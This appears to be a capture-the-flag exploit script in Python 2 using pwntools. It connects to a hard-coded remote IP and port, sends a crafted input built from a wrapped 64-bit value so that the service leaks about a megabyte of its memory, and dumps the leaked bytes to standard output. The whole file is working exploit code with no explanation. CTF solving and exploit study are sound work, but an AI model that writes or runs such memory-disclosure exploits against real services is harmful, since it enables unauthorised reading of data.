#!/usr/bin/env python
from pwn import *

N = 0x100000

r = remote('110.10.147.105', 12137)

r.readuntil('type exit if you want to exit')
r.sendline('@%dC%d' % ((1 << 64) - N, N))
r.readuntil('2. hex')
r.sendline('1')
r.readuntil('string to integer\n')

import sys
for _ in xrange(N / 1024):
    s = ''
    for _ in xrange(1024):
        s += chr(int(r.readuntil('\n')))
    sys.stdout.write(s)
